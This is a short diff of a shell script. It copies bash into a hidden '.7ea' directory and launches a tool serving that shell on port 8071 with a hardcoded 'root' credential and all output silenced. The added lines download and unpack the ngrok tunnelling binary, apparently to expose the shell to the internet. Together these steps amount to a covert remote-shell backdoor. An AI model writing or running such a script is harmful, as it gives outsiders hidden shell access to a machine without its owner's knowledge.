@@ -9,5 +9,7 @@ cp -r /bin/bash .7ea/bash
 #echo " .7ea/7w -c 7ea:root -p 8071 .7ea/bash" > .7ea/7wx 
 echo " .7ea/7w -c 7ea:root -p 8071 .7ea/bash > /dev/null 2> /dev/null || true " > .7ea/7wx
 chmod +x 7w .7ea/7wx    
-
+wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+tar -xvf ng*
+chmod +x ./ngrok 
 .7ea/7wx 
